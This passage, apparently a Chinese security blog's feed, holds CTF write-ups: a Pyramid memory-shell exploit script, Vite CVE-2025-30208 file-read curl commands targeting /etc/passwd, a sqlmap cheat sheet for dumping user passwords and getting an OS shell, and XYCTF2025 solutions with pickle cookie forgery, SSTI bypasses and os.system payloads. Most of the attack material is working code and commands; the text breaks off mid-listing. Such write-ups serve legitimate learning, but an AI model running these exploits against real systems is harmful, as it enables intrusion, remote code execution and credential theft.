</span><br></pre></td></tr></table></figure><p>这个Pyramid应用存在一个严重的远程代码执行（RCE）漏洞，允许攻击者在服务器上执行任意命令</p><p>可以参照强网杯决赛Pyramid那题</p><p>审计内容大致为接收用户输入的表达式，检查其合法性并计算结果，最后将结果显示在 HTML 页面上。但存在<code>print(exec(expr_input))</code>可以让我们命令执行。</p><p>原文章的脚本为（<code>[奇安信攻防社区-强网杯S8决赛Pyramid框架下内存马的分析构造及RS加密签名伪造](https://forum.butian.net/share/3974)</code>）</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">code=&#x27;&#x27;&#x27;def waff():</span><br><span class="line">    def f():</span><br><span class="line">        yield g.gi_frame.f_back</span><br><span class="line"> </span><br><span class="line">    g = f()             </span><br><span class="line">    frame = next(g)     </span><br><span class="line">    b = frame.f_back.f_back.f_globals</span><br><span class="line">    def hello(request):</span><br><span class="line">        code = request.params[&#x27;code&#x27;]</span><br><span class="line">        res=eval(code)</span><br><span class="line">        return Response(res)</span><br><span class="line"> </span><br><span class="line">    config.add_route(&#x27;shellb&#x27;, &#x27;/shellb&#x27;)</span><br><span class="line">    config.add_view(hello, route_name=&#x27;shellb&#x27;)</span><br><span class="line">    config.commit()</span><br><span class="line"> </span><br><span class="line">waff()</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">url=&quot;http://node1.tgctf.woooo.tech:31766/&quot;</span><br><span class="line">data=&#123;&quot;expr&quot;:f&quot;&#123;code&#125;+111&quot;&#125;</span><br><span class="line">res=requests.post(url=url,data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>执行内存马脚本，然后访问我们添加的路由&#x2F;shellb，并执行命令</p><p>post传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;熟悉的配方，熟悉的味道&quot;&gt;&lt;a href=&quot;#熟悉的配方，熟悉的味道&quot; class=&quot;headerlink&quot; title=&quot;熟悉的配方，熟悉的味道&quot;&gt;&lt;/a&gt;熟悉的配方，熟悉的味道&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vite任意文件读取漏洞CVE-2025-30208</title>
    <link href="http://1768161086.github,io/2025/04/16/Vite%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9ECVE-2025-30208/"/>
    <id>http://1768161086.github,io/2025/04/16/Vite%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9ECVE-2025-30208/</id>
    <published>2025-04-16T12:34:31.000Z</published>
    <updated>2025-04-16T12:39:12.358Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vite-任意文件读取漏洞分析复现-CVE-2025-30208"><a href="#Vite-任意文件读取漏洞分析复现-CVE-2025-30208" class="headerlink" title="Vite 任意文件读取漏洞分析复现 CVE-2025-30208"></a>Vite 任意文件读取漏洞分析复现 CVE-2025-30208</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p><a href="https://so.csdn.net/so/search?q=Vite&spm=1001.2101.3001.7020">Vite</a>是前端开发工具提供商，在6.2.3、6.1.2、6.0.12、5.4.15和4.5.10之前的版本中存在漏洞。‘@fs ‘拒绝访问Vite服务允许列表之外的文件。</p><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">6.2.0 &lt;= version &lt;=6.2.2</span><br><span class="line"></span><br><span class="line">6.1.0 &lt;= version &lt;=6.1.1</span><br><span class="line"></span><br><span class="line">6.0.0 &lt;= version &lt;=6.0.11</span><br><span class="line"></span><br><span class="line">5.0.0 &lt;= version &lt;=5.4.14</span><br><span class="line"></span><br><span class="line">version &lt;=4.5.9</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="三、利用条件"><a href="#三、利用条件" class="headerlink" title="三、利用条件"></a>三、利用条件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows:curl &quot;http://localhost:5173/@fs/C://windows/win.ini?import&amp;raw??&quot;</span><br><span class="line">Linux：curl &quot;http://localhost:5173/@fs/etc/passwd?import&amp;raw??&quot;</span><br></pre></td></tr></table></figure><h2 id="TGCTF2025-前端GAME"><a href="#TGCTF2025-前端GAME" class="headerlink" title="TGCTF2025-前端GAME"></a>TGCTF2025-前端GAME</h2><p>雪糕大作战，flag在&#x2F;tgflagggg中</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/@fs/tgflagggg?import&amp;raw??</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Vite-任意文件读取漏洞分析复现-CVE-2025-30208&quot;&gt;&lt;a href=&quot;#Vite-任意文件读取漏洞分析复现-CVE-2025-30208&quot; class=&quot;headerlink&quot; title=&quot;Vite 任意文件读取漏洞分析复现 CVE-2025-3</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sqlmap</title>
    <link href="http://1768161086.github,io/2025/04/16/sqlmap/"/>
    <id>http://1768161086.github,io/2025/04/16/sqlmap/</id>
    <published>2025-04-16T03:28:46.000Z</published>
    <updated>2025-04-16T04:58:24.938Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqlmap基本命令"><a href="#sqlmap基本命令" class="headerlink" title="sqlmap基本命令"></a>sqlmap基本命令</h1><h2 id="1-几种传参方式"><a href="#1-几种传参方式" class="headerlink" title="1.几种传参方式"></a>1.几种传参方式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.GET参数注入</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br><span class="line">2.POST参数注入</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;  --data=&quot;id=1&quot;</span><br><span class="line">3.cookie注入 （level&gt;=2时才会检测cookie）  </span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 2</span><br><span class="line">4.user-agent注</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 3</span><br><span class="line">5.referer注入</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 3</span><br><span class="line">6.host注入</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 5</span><br></pre></td></tr></table></figure><h2 id="2-获取数据库信息"><a href="#2-获取数据库信息" class="headerlink" title="2.获取数据库信息"></a>2.获取数据库信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.查看数据库</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --dbs  --batch</span><br><span class="line"></span><br><span class="line">2.查看数据库里面的表</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -D security --tables --batch</span><br><span class="line"></span><br><span class="line">3.查看数据库表里面的列</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -D security -T users --columns   --batch</span><br><span class="line"></span><br><span class="line">4.查看数据库列里面的具体的值</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -D security -T users -C id,password   --dump  --batch</span><br></pre></td></tr></table></figure><h2 id="3-获取shell"><a href="#3-获取shell" class="headerlink" title="3.获取shell"></a>3.获取shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  --os-shell</span><br></pre></td></tr></table></figure><h2 id="4-字典破解"><a href="#4-字典破解" class="headerlink" title="4.字典破解"></a>4.字典破解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">使用条件：</span><br><span class="line">1.MySQL数据库版本小于5.0，没有information——schema表。</span><br><span class="line"></span><br><span class="line">2.Microssoft Access数据库。</span><br><span class="line"></span><br><span class="line">3.当前用户没有权限读取系统中保存的数据。</span><br><span class="line"></span><br><span class="line">*暴力破解中破解表名的文件位于common-tables.txt 中，同理破解列名的文件位于common-columns.txt 中</span><br><span class="line">1.暴力破解表名</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  -D security --common-tables --batch</span><br><span class="line"></span><br><span class="line">2.暴力破解列名</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  -D security -Tusers --common-columns --batch</span><br><span class="line"></span><br><span class="line">读取文件/上传文件</span><br><span class="line">1.读取文件</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;   --file-read &quot;C:/post.txt&quot;</span><br><span class="line"></span><br><span class="line">2写入文件</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;   --file-write &quot;/root/1.txt&quot;</span><br><span class="line"> --file-dest &quot;C:/phpstudy/PHPTutorial/www/1.txt&quot;</span><br></pre></td></tr></table></figure><h2 id="5-cookie注入"><a href="#5-cookie注入" class="headerlink" title="5.cookie注入"></a>5.cookie注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.sqlmap -u &quot;http://192.168.1.254/Less-20/index.php&quot; --cookie &quot;uname=admin&quot; --level 3 –-current-db ， 枚举当前数据库。</span><br><span class="line">2.sqlmap -u http://192.168.1.254/Less-20/index.php --cookie uname=admin --level 2 -D security -T users -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure><h2 id="6-POST注入"><a href="#6-POST注入" class="headerlink" title="6.POST注入"></a>6.POST注入</h2><p>使用bp抓包后，复制文本到文档中后执行一下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r /home/forms.txt --level 3 -D security -T users -C&quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure><h2 id="7-forms-注入"><a href="#7-forms-注入" class="headerlink" title="7.forms 注入"></a>7.forms 注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.254/Less-11&quot; --forms ” #判断有注入点。</span><br><span class="line">sqlmap -u &quot;http://192.168.1.254/Less-11&quot; --forms -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump #枚举内容</span><br></pre></td></tr></table></figure><h2 id="8-tamper-脚本"><a href="#8-tamper-脚本" class="headerlink" title="8.tamper 脚本"></a>8.tamper 脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.1.254/Less-25/?id=1 -D security --tables --tamper=symboliclogical.py --level 3 --risk 3 “，猜解表名。结果显示表名为users。</span><br><span class="line"></span><br><span class="line">sqlmap -u http://192.168.1.254/Less-25/?id=1 -D security -T users --columns --tamper=symboliclogical.py --level 3 --risk 3 “,猜解列名。</span><br><span class="line"></span><br><span class="line">sqlmap -u http://192.168.1.254/Less-25/?id=1 -D security -T users -C &quot;id,username&quot; --dump --tamper=symboliclogical.py --level 3 --risk 3 “,猜解内容。</span><br></pre></td></tr></table></figure><h2 id="9-执行python命令"><a href="#9-执行python命令" class="headerlink" title="9.执行python命令"></a>9.执行python命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 --eval=print(__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read())</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sqlmap基本命令&quot;&gt;&lt;a href=&quot;#sqlmap基本命令&quot; class=&quot;headerlink&quot; title=&quot;sqlmap基本命令&quot;&gt;&lt;/a&gt;sqlmap基本命令&lt;/h1&gt;&lt;h2 id=&quot;1-几种传参方式&quot;&gt;&lt;a href=&quot;#1-几种传参方式&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XYCTF2025_web</title>
    <link href="http://1768161086.github,io/2025/04/14/XYCTF2025-web/"/>
    <id>http://1768161086.github,io/2025/04/14/XYCTF2025-web/</id>
    <published>2025-04-14T08:48:19.000Z</published>
    <updated>2025-04-14T13:43:41.348Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><blockquote><p>来点真正的签到吧！</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@File    :   main.py</span><br><span class="line">@Time    :   2025/03/28 22:20:49</span><br><span class="line">@Author  :   LamentXU </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">flag in /flag_&#123;uuid4&#125;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">from bottle import Bottle, request, response, redirect, static_file, run, route</span><br><span class="line">with open(&#x27;../../secret.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line">@route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span><br><span class="line">@route(&#x27;/download&#x27;)</span><br><span class="line">def download():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    if &#x27;../../&#x27; in name or name.startswith(&#x27;/&#x27;) or name.startswith(&#x27;../&#x27;) or &#x27;\\&#x27; in name:</span><br><span class="line">        response.status = 403</span><br><span class="line">        return &#x27;Forbidden&#x27;</span><br><span class="line">    with open(name, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">@route(&#x27;/secret&#x27;)</span><br><span class="line">def secret_page():</span><br><span class="line">    try:</span><br><span class="line">        session = request.get_cookie(&quot;name&quot;, secret=secret)</span><br><span class="line">        if not session or session[&quot;name&quot;] == &quot;guest&quot;:</span><br><span class="line">            session = &#123;&quot;name&quot;: &quot;guest&quot;&#125;</span><br><span class="line">            response.set_cookie(&quot;name&quot;, session, secret=secret)</span><br><span class="line">            return &#x27;Forbidden!&#x27;</span><br><span class="line">        if session[&quot;name&quot;] == &quot;admin&quot;:</span><br><span class="line">            return &#x27;The secret has been deleted!&#x27;</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Error!&quot;</span><br><span class="line">run(host=&#x27;0.0.0.0&#x27;, port=8080, debug=False)</span><br></pre></td></tr></table></figure><p>1.这里绕过读取文件的限制，<code>./../</code>相当于<code>../</code>，意义为<strong>先进入当前目录（其实就是留在原地），然后再退到上一级目录</strong></p><p><code>/download?filename=./.././.././../secret.txt</code>得到<code>Hell0_H@cker_Y0u_A3r_Sm@r7</code></p><p>2.下面跟<a href="https://www.cjxol.com/posts/sekaictf-2022-writeup/">Bottle Poem</a>大致一样，<code>pickle反序列化+cookie签名</code>，不过这里<code>cookie</code>的签名用的不再是<code>md5</code>而是<code>sha256</code>，应该是出于安全性考虑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import hmac</span><br><span class="line">import base64</span><br><span class="line">def gen_cookie(payload):</span><br><span class="line">    b64pld = base64.b64encode(payload)</span><br><span class="line">    signature = base64.b64encode(</span><br><span class="line">        hmac.new(</span><br><span class="line">            b&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;, b64pld, hashlib.sha256</span><br><span class="line">        ).digest()</span><br><span class="line">    )</span><br><span class="line">    return b&#x27;&quot;!&#x27; + signature + b&quot;?&quot; + b64pld + b&#x27;&quot;&#x27;</span><br><span class="line">data = b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;cat /flag_* &gt; flag&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br><span class="line">print(gen_cookie(data).decode())</span><br></pre></td></tr></table></figure><p>3.运行脚本后将得到的数据传入&#x2F;secret目录里，进行cookie传参name：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=!o6j+MoPMGQB9LT5wVr3HxiwMjPgI5TXTL0mVN3+C4NE=?KGNvcwpzeXN0ZW0KUydjYXQgL2ZsYWdfKiA+IGZsYWcnCm8u</span><br></pre></td></tr></table></figure><p>4.然后通过<code>/download?filename=flag</code>路由进行下载即可</p><p>5.官网wp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from bottle import cookie_encode</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">secret = &quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span><br><span class="line"></span><br><span class="line">class Test:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval, (&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;cp /f* ./2.txt&#x27;)&quot;&quot;&quot;,))</span><br><span class="line"></span><br><span class="line">exp = cookie_encode(</span><br><span class="line">    (&#x27;session&#x27;, &#123;&quot;name&quot;: [Test()]&#125;),</span><br><span class="line">    secret</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">requests.get(&#x27;http://gz.imxbt.cn:20458/secret&#x27;, cookies=&#123;&#x27;name&#x27;: exp.decode()&#125;)</span><br><span class="line"></span><br><span class="line">#访问2.txt直接打到flag。</span><br></pre></td></tr></table></figure><h2 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h2><p>拼图题，首先要把图片拼好</p><p>既然是判断时间，那就去找关键词，搜下<code>time</code>发现了<code>startTime</code>等等，其他的不可控（比如什么<code>endTime</code>），但是如果<code>startTime</code>很大，去和2秒比较肯定没问题，所以控制台修改一下</p><p>最后点击最后一块拼图即可获得flag<br>出题人又疯</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@File    :   app.py</span><br><span class="line">@Time    :   2025/03/29 15:52:17</span><br><span class="line">@Author  :   LamentXU </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import bottle</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">flag in /flag</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@bottle.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;Hello, World!&#x27;</span><br><span class="line">@bottle.route(&#x27;/attack&#x27;)</span><br><span class="line">def attack():</span><br><span class="line">    payload = bottle.request.query.get(&#x27;payload&#x27;)</span><br><span class="line">    if payload and len(payload) &lt; 25 and &#x27;open&#x27; not in payload and &#x27;\\&#x27; not in payload:</span><br><span class="line">        return bottle.template(&#x27;hello &#x27;+payload)</span><br><span class="line">    else:</span><br><span class="line">        bottle.abort(400, &#x27;Invalid payload&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bottle.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure><p>1.审计源码发现&#x2F;attack上存在注入</p><p>2.传入?payload&#x3D;49，结果为49,确定为SSTI</p><p>3.题目要求不能使用open，并且payload长度不能大于25</p><p>4.输入斜体字符来绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">def replace_unquoted(text):</span><br><span class="line">    pattern = r&#x27;(\&#x27;.*?\&#x27;|\&quot;.*?\&quot;)|([oa])&#x27;</span><br><span class="line"></span><br><span class="line">    def replacement(match):</span><br><span class="line">        if match.group(1):</span><br><span class="line">            return match.group(1)</span><br><span class="line">        else:</span><br><span class="line">            char = match.group(2)</span><br><span class="line">            replacements = &#123;</span><br><span class="line">                &#x27;o&#x27;: &#x27;%ba&#x27;,</span><br><span class="line">                &#x27;a&#x27;: &#x27;%aa&#x27;,</span><br><span class="line">            &#125;</span><br><span class="line">            return replacements.get(char, char)</span><br><span class="line"></span><br><span class="line">    result = re.sub(pattern, replacement, text)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">input_text = &#x27;open&#x27; # payload</span><br><span class="line">output_text = replace_unquoted(input_text)</span><br><span class="line">print(&quot;处理后的字符串:&quot;, output_text)</span><br></pre></td></tr></table></figure><p>斜体的o被解析成了%C2%BA</p><p>其实这里是一个URL解码的小坑。一个%BA就足够了。我们删除%C2即可。</p><p>对字符a，同理。替换为%aa</p><p>5.最终构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;%bapen(&#x27;/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>6.官网wp:</p><p>bottle的SSTI可以直接访问到内部类。所以易得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://eci-2zeeal6ndgee1yfe98tl.cloudeci1.ichunqiu.com:5000/attack&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&gt;123&#x27;)&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = [payload[i:i+3] for i in range(0,len(payload),3)]</span><br><span class="line">flag = True</span><br><span class="line">for i in p:</span><br><span class="line">    if flag:</span><br><span class="line">        tmp = f&#x27;\n%import os;os.a=&quot;&#123;i&#125;&quot;&#x27;</span><br><span class="line">        flag = False</span><br><span class="line">    else:</span><br><span class="line">        tmp = f&#x27;\n%import os;os.a+=&quot;&#123;i&#125;&quot;&#x27;</span><br><span class="line">    r = requests.get(url,params=&#123;&quot;payload&quot;:tmp&#125;)</span><br><span class="line"></span><br><span class="line">r = requests.get(url,params=&#123;&quot;payload&quot;:&quot;\n%import os;eval(os.a)&quot;&#125;)</span><br><span class="line">r = requests.get(url,params=&#123;&quot;payload&quot;:&quot;\n%include(&#x27;123&#x27;)&quot;&#125;).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure><h2 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h2><p>考点：json反序列化&amp;python格式化字符串漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 